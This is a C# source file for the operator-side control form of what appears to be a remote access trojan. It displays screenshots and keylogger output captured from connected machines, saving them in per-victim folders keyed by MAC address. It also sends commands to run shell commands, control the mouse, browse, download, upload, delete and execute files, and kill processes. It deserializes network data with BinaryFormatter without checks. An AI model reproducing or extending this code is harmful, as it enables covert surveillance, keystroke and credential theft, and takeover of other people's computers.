using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using MetroFramework.Forms;
using System.IO;
using System.Threading;
using System.Runtime.Serialization.Formatters.Binary;
namespace Server
{
    public partial class ScreenShootForm : MetroForm
    {
        static string UserPath = Environment.CurrentDirectory + @"\Users" ; 
        
        public Client client;
        public string DownloadPath;
        public string DesktopPath;
        public string LogPath;
        public string CurrentUserPath;
        public ScreenShootForm(Client c)
        {
            client = c;
            client.RecievedEvent += client_RecievedEvent;
            client.DisconnectedEvent += client_DisconnectedEvent;
            CurrentUserPath = UserPath + @"\" + client.Mac;
            DownloadPath = CurrentUserPath + @"\Downloads";
            DesktopPath = CurrentUserPath + @"\Desktop";
            LogPath = CurrentUserPath + @"\log.txt";
            if (!Directory.Exists(CurrentUserPath)) Directory.CreateDirectory(CurrentUserPath);
            InitializeComponent();
        }
       

        void client_DisconnectedEvent(Client sender)
        {
            //throw new NotImplementedException();
        }
        private static TreeNode BytesToTreeNodes(byte[] data, string s)
        {


            BinaryFormatter bf = new BinaryFormatter();
            object obj = bf.Deserialize(new MemoryStream(data));

            TreeNode[] nodeList = (obj as IEnumerable<TreeNode>).ToArray();
            TreeNode Node = new TreeNode(s);
            Node.Nodes.AddRange(nodeList);
            return Node;
        }
        private static TreeNode[] BytesToArrangeNodes(byte[] data)
        {


            BinaryFormatter bf = new BinaryFormatter();
            object obj = bf.Deserialize(new MemoryStream(data));

            TreeNode[] nodeList = (obj as IEnumerable<TreeNode>).ToArray();
            
            return nodeList;
        }
        void client_RecievedEvent(Client sender, MemoryStream data)
        {
            if (!client.Running) return; 
             BinaryReader br = new BinaryReader(data);
             
           Commands Header = (Commands)br.ReadInt32();
           switch (Header)
           {
               case Commands.Image:
                   byte[] imageBtyes = br.ReadBytes(br.ReadInt32());
                   Invoke((MethodInvoker)delegate
                   {
                       pictureBox1.Image = Image.FromStream(new MemoryStream(imageBtyes));//(Image)(new Bitmap(Image.FromStream(new MemoryStream(imageBtyes)), new Size(450,450)));
                   });
                   if (saveCheck.Checked)
                   {
                       if (!Directory.Exists(DesktopPath)) Directory.CreateDirectory(DesktopPath);
                       try
                       {
                           File.WriteAllBytes(DesktopPath + @"\" + DateTime.Now.ToString().Replace('/', '-').Replace(':', '.') + ".jpeg", imageBtyes);
                       }
                       catch { }
                      
                   }
                   if (videoCheck.Checked)
                   {

                       client.Send(BitConverter.GetBytes((int)Commands.Image));
                   }
                   break;

               case Commands.KeyLogger:
                     string s =  Encoding.ASCII.GetString(br.ReadBytes(br.ReadInt32()));
                   Invoke((MethodInvoker)delegate
                  {
                    
                      richBox.Text = richBox.Text + s; 

                  });
                   FileStream LogFile = new FileStream(LogPath, FileMode.Append);
                   BinaryWriter bw = new BinaryWriter(LogFile);
                   bw.Write(Encoding.ASCII.GetBytes(s));
                   LogFile.Close();
                   break;
               case Commands.Directory:

                   while (true)
                   {
                       int Length = br.ReadInt32();
                       if (Length < 0) break;
                       byte[] NodeByte = br.ReadBytes(Length);

                       string NodeName = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));
                       TreeNode Node = BytesToTreeNodes(NodeByte, NodeName);
                       Invoke((MethodInvoker)delegate
                 {
                     treeView1.Nodes.Add(Node);
                 });  

                   }

                   break;
               case Commands.Cmd:
                   Invoke((MethodInvoker)delegate
                  {
                      textCommandOutPut.Text = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));

                  });
                   break;
               case Commands.GetDisks:
                   Invoke((MethodInvoker)delegate
                   {
                       treeView1.Nodes.Clear();

                       while (true)
                       {
                           int Length = br.ReadInt32();
                           if (Length < 0) break;
                           treeView1.Nodes.Add(Encoding.Unicode.GetString(br.ReadBytes(Length)));

                       }
                   });


                   break;

               case Commands.SubDirectory:
                   Invoke((MethodInvoker)delegate
                   {
                       string path = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32())) ;
                       byte[] NodesByte = br.ReadBytes(br.ReadInt32());
                      
                       treeView1.SelectedNode.Nodes.Clear();
                       treeView1.SelectedNode.Nodes.AddRange(BytesToArrangeNodes(NodesByte));
                       
                        
                   });
                   
                   break;
               case Commands.Download:
                   byte[] ByteFile = br.ReadBytes(br.ReadInt32());
                   string Name = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));
                   if (!Directory.Exists(DownloadPath)) Directory.CreateDirectory(DownloadPath);
                   if(!File.Exists(DownloadPath + @"\" + Name))
                   File.WriteAllBytes(DownloadPath + @"\" + Name, ByteFile);




                   break;

               case Commands.Porcess:
                   int ProccesCount = br.ReadInt32();
                   Invoke((MethodInvoker)delegate
                   {
                       listBox1.Items.Clear();
                       for (int i = 0; i < ProccesCount; i++)
                       {
                           listBox1.Items.Add(Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32())));
                           
                       }
                   });

                   break;

           }
        }

        private void ScreenShootForm_Load(object sender, EventArgs e)
        {

        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            if (client.Connected)
            {
                MemoryStream ms = new MemoryStream();
                BinaryWriter bw = new BinaryWriter(ms);
                bw.Write((int)Commands.Image);
                client.Send(ms.ToArray());
            }
        }

        private void videoCheck_CheckedChanged(object sender, EventArgs e)
        {
            if (client.Connected)
            {
      //          MemoryStream ms = new MemoryStream();
    //            BinaryWriter bw = new BinaryWriter(ms);
  //              bw.Write((int)Commands.Image);

//                byte[] data = ms.ToArray();

                //new Thread(() =>
                //{

                //    while (videoCheck.Checked)
                //    {
                    //    client.Send(data);
                //        Thread.Sleep(1000);

                //    }
                //    Thread.CurrentThread.Abort();
                //}).Start();
            }
           

        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            if (client.Connected)
            {
                if (controlCheck.Checked)
                {
                    Thread.Sleep(100);
                    MemoryStream ms = new MemoryStream();
                    BinaryWriter bw = new BinaryWriter(ms);
                    bw.Write((int)Commands.Control);
                    bw.Write(e.X);
                    bw.Write(e.Y);

                    client.Send(ms.ToArray());

                }
            }
        }

        private void metroButton2_Click(object sender, EventArgs e)
        {
            if (client.Connected)
            {
                MemoryStream ms = new MemoryStream();
                BinaryWriter bw = new BinaryWriter(ms);
                bw.Write((int)Commands.KeyLogger);
                client.Send(ms.ToArray());
            }
        }

        private void metroTabControl1_KeyPress(object sender, KeyPressEventArgs e)
        {
           
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            if (client.Connected)
            {

                MemoryStream ms = new MemoryStream();
                BinaryWriter bw = new BinaryWriter(ms);
                bw.Write((int)Commands.Directory);

                client.Send(ms.ToArray());
            }
             
        }

        private void metroButton4_Click(object sender, EventArgs e)
        {
            if (client.Connected)
            {
                MemoryStream ms = new MemoryStream();
                BinaryWriter bw = new BinaryWriter(ms);
                bw.Write((int)Commands.Cmd);
                byte[] ToSend = Encoding.Unicode.GetBytes(textCommandInput.Text);
                bw.Write(ToSend.Length);
                bw.Write(ToSend);
                client.Send(ms.ToArray());
            }
        }

        private void pictureBox1_MouseClick(object sender, MouseEventArgs e)
        {
            if (client.Connected)
            {
                if (controlCheck.Checked)
                {
                    if (e.Button == System.Windows.Forms.MouseButtons.Left)
                    {
                        MemoryStream ms = new MemoryStream();
                        BinaryWriter bw = new BinaryWriter(ms);
                        bw.Write((int)Commands.MouseClick);
                        client.Send(ms.ToArray());
                        return;
                    }
                    if (e.Button == System.Windows.Forms.MouseButtons.Right)
                    {
                        MemoryStream ms = new MemoryStream();
                        BinaryWriter bw = new BinaryWriter(ms);
                        bw.Write((int)Commands.RightMouseClick);
                        client.Send(ms.ToArray());


                    }
                }
            }
        }

        private void ScreenShootForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            client.Running = false;
            client.RecievedEvent -= client_RecievedEvent;
            client.DisconnectedEvent -= client_DisconnectedEvent;
            videoCheck.Checked = false;
            saveCheck.Checked = false; 
           // this.DestroyHandle();
            //this.Dispose();
            this.Dispose();

        }

        private void treeView1_MouseClick(object sender, MouseEventArgs e)
        {
           
        }

      
        private void treeView1_Click(object sender, EventArgs e)
        {
            
        }

        private void metroButton5_Click(object sender, EventArgs e)
        {
            MemoryStream ms = new MemoryStream();
            BinaryWriter bw = new BinaryWriter(ms);
            bw.Write((int)Commands.GetDisks);
            client.Send(ms.ToArray());
        }

        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == System.Windows.Forms.MouseButtons.Right)
            {
                metroContextMenu1.Show(Cursor.Position.X+10,Cursor.Position.Y+10); 


            }
            
        }

        private void treeView1_NodeMouseDoubleClick(object sender, TreeNodeMouseClickEventArgs e)
        {
          
            MemoryStream ms = new MemoryStream();
            BinaryWriter bw = new BinaryWriter(ms);
            bw.Write((int)Commands.SubDirectory);
            byte[] pathByte = Encoding.Unicode.GetBytes(treeView1.SelectedNode.FullPath);
            bw.Write(pathByte.Length);
            bw.Write(pathByte);
            client.Send(ms.ToArray());

        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MemoryStream ms = new MemoryStream();
            BinaryWriter bw = new BinaryWriter(ms);
            bw.Write((int)Commands.Delete);
            byte[] path = Encoding.Unicode.GetBytes(treeView1.SelectedNode.FullPath);
            bw.Write(path.Length);
            bw.Write(path);
            client.Send(ms.ToArray());

        }

        private void metroContextMenu1_Opening(object sender, CancelEventArgs e)
        {

        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MemoryStream ms = new MemoryStream();
            BinaryWriter bw = new BinaryWriter(ms);
            bw.Write((int)Commands.Download);
            byte[] path = Encoding.Unicode.GetBytes(treeView1.SelectedNode.FullPath);
            bw.Write(path.Length);
            bw.Write(path);
            client.Send(ms.ToArray());
           
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                string FullPath = openFileDialog1.FileName ; 
                string  ReverseFileName = "";
                for(int i=FullPath.Length-1; i>=0 ;i--){
                    if(FullPath[i] == '\\' ) break;
                    ReverseFileName += FullPath[i];

                }
                string FileName = "";
                for(int i=ReverseFileName.Length-1;i>=0;i--)
                    FileName += ReverseFileName[i]; 
                string path = treeView1.SelectedNode.FullPath+@"\" + FileName;
                byte[] PathByte = Encoding.Unicode.GetBytes(path);
                MemoryStream ms = new MemoryStream();
                BinaryWriter bw = new BinaryWriter(ms);
                bw.Write((int)Commands.Upload);
                bw.Write(PathByte.Length);
                bw.Write(PathByte);
                byte[] FileByte = File.ReadAllBytes(FullPath);
                bw.Write(FileByte.Length);
                bw.Write(FileByte);

                client.Send(ms.ToArray());

            }
        }

        private void runToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
            byte[] PathByte = Encoding.Unicode.GetBytes(treeView1.SelectedNode.FullPath);
            MemoryStream ms = new MemoryStream();
            BinaryWriter bw = new BinaryWriter(ms);
            bw.Write((int)Commands.Run);
            bw.Write(PathByte.Length);
            bw.Write(PathByte);
            client.Send(ms.ToArray());
            
        }

        private void metroButton6_Click(object sender, EventArgs e)
        {
            MemoryStream ms = new MemoryStream();
            BinaryWriter bw = new BinaryWriter(ms);
            bw.Write((int)Commands.Porcess);
            client.Send(ms.ToArray());
        }

        private void metroTabPage5_Click(object sender, EventArgs e)
        {

        }

        private void listBox1_MeasureItem(object sender, MeasureItemEventArgs e)
        {
        
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MemoryStream ms = new MemoryStream();
            BinaryWriter bw = new BinaryWriter(ms);
            bw.Write((int)Commands.CloseProcess);
            byte[] ProcesName = Encoding.Unicode.GetBytes(listBox1.SelectedItem.ToString());
       
            bw.Write(ProcesName.Length);
            bw.Write(ProcesName);
            client.Send(ms.ToArray());

        }

        private void listBox1_MouseClick(object sender, MouseEventArgs e)
        {
           
        }

        private void listBox1_Click(object sender, EventArgs e)
        {
            
        }

        private void listBox1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if ( listBox1.Items.Count > 0)
            {

                metroContextMenu2.Show(Cursor.Position.X + 10, Cursor.Position.Y + 10);
            }
        }

        

    }
}
